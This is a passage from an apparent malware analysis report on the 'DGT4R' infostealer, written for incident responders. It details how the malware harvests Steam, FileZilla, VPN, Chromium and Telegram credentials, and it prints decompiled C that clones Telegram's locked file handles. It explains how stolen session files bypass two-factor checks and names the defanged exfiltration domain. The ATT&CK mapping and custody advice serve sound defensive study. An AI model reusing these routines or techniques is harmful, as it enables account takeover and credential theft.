   - pattern: `ssfn*` (hidden system files, e.g. `ssfn1849204918204918290`).
   - these files contain the cryptographic authorization secret paired with the victim's hardware profile.
   - if an attacker imports the victim's credentials alongside the corresponding `ssfn` file into a new steam client, **steam guard two-factor email verification is completely bypassed**, granting immediate access to games, inventory items, and steam community market wallets.

---

### 2. filezilla ftp/sftp credential harvester

filezilla stores saved server connections, hosts, ports, usernames, and passwords in unencrypted or base64-encoded xml files within the user's roaming application directory:
- `%APPDATA%\FileZilla\sitemanager.xml`
- `%APPDATA%\FileZilla\recentservers.xml`

the parser at `+0xD97D0`:
1. opens each xml configuration file via `ZwOpenFile`.
2. scans the document for xml nodes: `<Host>`, `<Port>`, `<User>`, `<Pass>`.
3. checks the encoding attribute:
   - if `encoding="base64"`, passes the string to `lazy_CryptStringToBinaryA`.
   - if unencoded, extracts the plaintext password directly.
4. formats the recovered credentials into standard uri syntax:
   ```text
   ftp://username:password@hostname:port
   ```
5. stages records into `%TEMP%\_<hex_id>.tmp\filezilla.txt`.

---

### 3. vpn client configuration and profile harvester

to facilitate lateral movement within corporate networks, `DGT4R` hunts for installed virtual private network (vpn) client configuration profiles:
- **OpenVPN**: scans `%USERPROFILE%\OpenVPN\config\` and `%APPDATA%\OpenVPN Connect\profiles\` for `.ovpn` configuration files, client certificates (`.crt`), and private keys (`.key`).
- **ProtonVPN**: scans `%LOCALAPPDATA%\ProtonVPN\` for user session tokens and saved server configurations.
- **NordVPN**: scans `%LOCALAPPDATA%\NordVPN\` for `user.config` files containing base64-encoded encrypted credentials.

---

## chromium multi-profile crawling and profile path sanitization ( +0x6A100, +0x6BA60 )

### 1. multi-profile parsing from local state json

enterprises and shared workstations frequently host multiple separate profiles within a single chromium installation (e.g., personal browsing, corporate google workspace accounts, and dedicated cryptocurrency browsing profiles). `DGT4R` does not merely check the standard `Default` folder; it executes an automated multi-profile discovery subroutine at `+0x6A100`:

1. opens `Local State` in the browser root directory:
   ```text
   %LOCALAPPDATA%\Google\Chrome\User Data\Local State
   ```
2. parses the json object `profile.info_cache`.
3. extracts each registered profile folder key (e.g., `Default`, `Profile 1`, `Profile 2`, `Profile 3`).
4. retrieves profile metadata:
   - `name`: user display label.
   - `email`: associated google account email address.
   - `is_ephemeral`: flags temporary guest profiles.
5. constructs absolute filesystem paths for each profile directory:
   ```text
   %LOCALAPPDATA%\Google\Chrome\User Data\{PROFILE_NAME}\
   ```

---

### 2. profile path validation and sanitization routine ( +0x6BA60 )

prior to attempting database access, each constructed path is processed by `sanitize_browser_profile_path` at `+0x6BA60` to prevent directory traversal bugs, malformed path crashes, or redundant queries on non-existent directories:

```c
// decompiled profile path validator at +0x6BA60
BOOL sanitize_browser_profile_path(const wchar_t* root_path, const wchar_t* profile_name, wchar_t* out_clean_path) {
    if (root_path == NULL || profile_name == NULL || out_clean_path == NULL) {
        return FALSE;
    }

    // verify path does not exceed Windows MAX_PATH ( 260 chars )
    size_t root_len = wcslen(root_path);
    size_t prof_len = wcslen(profile_name);
    if (root_len + prof_len + 2 >= MAX_PATH) {
        return FALSE;
    }

    // construct combined wide path
    wcscpy_s(out_clean_path, MAX_PATH, root_path);
    if (out_clean_path[root_len - 1] != L'\\') {
        wcscat_s(out_clean_path, MAX_PATH, L"\\");
    }
    wcscat_s(out_clean_path, MAX_PATH, profile_name);

    // verify target directory exists using native direct syscall
    OBJECT_ATTRIBUTES obj_attr;
    UNICODE_STRING uni_path;
    IO_STATUS_BLOCK io_status;
    HANDLE hDir = NULL;

    RtlInitUnicodeString(&uni_path, out_clean_path);
    InitializeObjectAttributes(&obj_attr, &uni_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = sys_ZwOpenFile(
        &hDir,
        FILE_LIST_DIRECTORY | SYNCHRONIZE,
        &obj_attr,
        &io_status,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (NT_SUCCESS(status) && hDir != NULL) {
        sys_ZwClose(hDir);
        return TRUE;
    }

    return FALSE;
}
```

for every validated profile directory, `DGT4R` schedules parallel extraction tasks for:
- `{PROFILE_NAME}\Login Data` (credentials)
- `{PROFILE_NAME}\Network\Cookies` (session tokens)
- `{PROFILE_NAME}\Web Data` (credit cards, bank ibans, google oauth tokens)
- `{PROFILE_NAME}\History` (visited domains and exchange urls)

---

## telegram tdata binary format and session key derivation ( +0xDA140, +0xDD250 )

### 1. internal structure of telegram desktop datastores

telegram desktop stores session authorization keys inside binary files rather than sqlite databases. the stealer targets two critical components within `%APPDATA%\Telegram Desktop\tdata`:

#### 1. `key_datas`
- header: 16-byte magic identifier.
- salt: 32-byte cryptographic salt.
- encrypted master key block: 288 bytes containing local encryption keys protected via sha-1 / aes-256-ige.

#### 2. session map file (`D87FBAC601CA38A*` / `map*`)
- contains serialized account metadata:
  - `dc_id`: telegram datacenter identifier (e.g., dc 1, 2, 4, 5).
  - `user_id`: 64-bit numerical telegram account id.
  - `auth_key`: 2048-bit ( 256-byte ) persistent mtproto authorization key.

---

### 2. handle cloning for running telegram instances ( +0xDD250 )

if the victim is actively using telegram desktop, `Telegram.exe` maintains exclusive read/write locks on `key_datas` and the active map file. `DGT4R` resolves this lock without alerting the user:

```c
// decompiled telegram handle duplication routine at +0xDD250
BOOL clone_telegram_file_handle(const wchar_t* target_subpath, void** out_file_bytes, size_t* out_file_size) {
    // 1. locate running Telegram.exe process ID via direct syscall ZwQuerySystemInformation
    DWORD telegram_pid = find_process_id_by_hash( 0x7A9B1204 ); // DJB2 hash of 'telegram.exe'
    if (telegram_pid == 0) {
        // process not running; open directly from disk
        return read_file_direct_syscall(target_subpath, out_file_bytes, out_file_size);
    }

    // 2. obtain process handle with direct syscall ZwOpenProcess
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES obj_attr;
    CLIENT_ID client_id = { (HANDLE)(DWORD_PTR)telegram_pid, NULL };
    InitializeObjectAttributes(&obj_attr, NULL, 0, NULL, NULL);
    sys_ZwOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &obj_attr, &client_id);

    if (!hProcess) return FALSE;

    // 3. enumerate handles belonging to the Telegram process
    PSYSTEM_HANDLE_INFORMATION handle_info = query_system_handles();
    for (ULONG i = 0; i < handle_info->HandleCount; i++) {
        if (handle_info->Handles[i].ProcessId == telegram_pid) {
            HANDLE hDuplicate = NULL;
            // clone handle into malware process context using ZwDuplicateObject
            NTSTATUS status = sys_ZwDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handle_info->Handles[i].Handle,
                NtCurrentProcess(),
                &hDuplicate,
                FILE_GENERIC_READ,
                0,
                DUPLICATE_SAME_ACCESS
            );

            if (NT_SUCCESS(status) && hDuplicate != NULL) {
                // check if handle refers to target tdata file
                if (is_target_tdata_file(hDuplicate, target_subpath)) {
                    read_file_from_handle(hDuplicate, out_file_bytes, out_file_size);
                    sys_ZwClose(hDuplicate);
                    sys_ZwClose(hProcess);
                    free(handle_info);
                    return TRUE;
                }
                sys_ZwClose(hDuplicate);
            }
        }
    }

    sys_ZwClose(hProcess);
    free(handle_info);
    return FALSE;
}
```

once cloned, `DGT4R` stages the entire `tdata` directory hierarchy into `%TEMP%\_<hex_id>.tmp\telegram\`. importing this directory onto any clean machine running telegram desktop restores full, authenticated account access without prompting for 2fa passwords or sending login notification sms alerts.

---

## mitre att&ck framework mapping and threat matrix

to aid enterprise security operations centers (soc) and incident response teams in mapping `DGT4R` activity to the mitre att&ck matrix, the following matrix correlates identified capabilities with their corresponding tactics, techniques, and internal malware subsystems:

| att&ck tactic | att&ck technique | technique id | malware implementation & internal rva | mitigation & defensive control |
| :--- | :--- | :--- | :--- | :--- |
| **Defense Evasion** | Direct System Calls | `T1055` / `T1562.001` | dynamically parses `ntdll.dll` pe headers and sorts export virtual addresses to deduce ssns (`+0x687D0`, `+0x69070`, `+0x217B50`), bypassing edr inline user-mode hooks | deploy kernel-mode edr telemetry (etw-ti - event tracing for windows threat intelligence) and hypervisor-protected code integrity (hvci) |
| **Defense Evasion** | Obfuscated Files or Information | `T1027` | position-dependent rolling xor cipher (`+0x671F0`) mutates keys per character position; 41,141 unrolled instructions (`+0x5010`) synthesize bip-39 wordlist | inspect in-memory execution signatures via automated memory memory analysis and memory-scanning yara rules |
| **Defense Evasion** | Subvert Trust Controls | `T1553` | injects switches (`ignore-certificate-errors`) into electron `main/index.js` (`+0xB7850`) and sets winhttp flags to ignore invalid cas | enforce electron fuses (`EnableEmbeddedAsarIntegrityValidation`) to enforce digital signature validation on asar archives |
| **Persistence** | Registry Run Keys | `T1547.001` | creates autostart value `WindowsRecovery` under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (`+0xF0AA0`) | audit and restrict user-writable registry autorun entries via group policy or endpoint privilege management |
| **Credential Access** | Credentials from Web Browsers | `T1555.003` | extracts chromium dpapi master key (`+0xE19B0`), decrypts v20 app-bound aes-256-gcm records (`+0xE24C0`), and loads `nss3.dll` for firefox (`+0xE5100`) | enable app-bound encryption enforcement, utilize fido2/webauthn hardware security keys, and prevent browser password caching |
| **Credential Access** | Credentials in Files | `T1552.001` | clones locked handles via `ZwDuplicateObject` to carve metamask and phantom leveldb datastores (`+0x91FF0`, `+0xD6800`); steals steam `ssfn` tokens (`+0xD97D0`) | enforce full-disk encryption and restrict access permissions on `%LOCALAPPDATA%\...\Local Extension Settings` directories |
| **Collection** | Clipboard Data | `T1115` | background loop polls clipboard every 500ms via direct syscall `ZwDelayExecution` (`+0x88AB0`), substituting btc, eth, trx, ltc, sol, and doge addresses | utilize modern endpoint isolation tools or secure clipboard sandboxing when interacting with cryptocurrency exchanges |
| **Collection** | Screen Capture | `T1113` | captures multi-monitor screen buffers via gdi+ (`+0xCFF20`) and 60fps gpu frames via directx dxgi desktop duplication (`+0x1A3500`) | restrict unverified background execution and monitor directx desktop duplication interface instantiation |
| **Collection** | Audio & Video Capture | `T1123` / `T1125` | queries windows media foundation attributes (`MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE`) to spy on webcams and microphones (`+0x1A4200`) | enforce physical privacy shutters and restrict camera/microphone access in windows privacy settings |
| **Lateral Movement** | Automated DM Worm | `T1567` | leverages stolen discord authorization tokens to enumerate dm channels and disseminate malicious download bait (`+0x9B550`, `+0x9C280`) | implement discord multi-factor authentication (mfa) and educate personnel on social engineering lures distributed via instant messaging |
| **Command & Control** | Application Layer Protocol | `T1071.001` | establishes tls encrypted https communication to `hxxps[://]doxbin[.]cy` for registration (`/init`) and staging exfiltration (`/exfiltrate`) | block resolution of malicious network domains at dns resolver level and inspect outbound enterprise tls egress proxies |

---

## hardware-enforced security recommendations for high-value cryptocurrency custodians

given the sophisticated multi-vector theft capabilities demonstrated by `DGT4R` (in-memory bip-39 dictionary extraction, clipboard hijacking, memory scanning, leveldb vault parsing, and electron asar backdooring), software-only security measures on general-purpose consumer operating systems are fundamentally insufficient to guarantee asset safety.

### 1. air-gapped hardware wallets (cold storage)

cryptocurrency holders must never enter, store, or display 12 or 24-word recovery seeds on internet-connected general-purpose computers:
- **isolated key generation**: hardware signing devices (such as ledger, trezor, keystone, or coldcard) generate cryptographic entropy within an isolated secure element (se) or secure microcontroller. private keys never enter windows host ram, rendering in-memory seed hunters like `collect_bip39_phrases` (`+0xD5E00`) and electron hooks (`+0xB8100`) completely ineffective.
- **hardware-screen address verification**: when approving transactions, users must visually compare the destination address displayed on the physical hardware screen with the intended recipient. because clipboard clippers (`+0x894F0`) swap addresses in the host clipboard, the hardware device will display the attacker's address, allowing the user to detect the tampering immediately and reject the transaction.

### 2. multi-signature (multisig) governance

for enterprise treasuries, web3 organizations, and high-net-worth individuals:
- configure multi-signature vaults requiring M-of-N independent approvals (e.g., 2-of-3 or 3-of-5) distributed across physically separated hardware devices and geographic locations.
- even if a desktop machine hosting one signing key is fully compromised by `DGT4R`, the threat actor cannot execute unauthorized transfers without compromising the threshold quorum of signing keys.

---
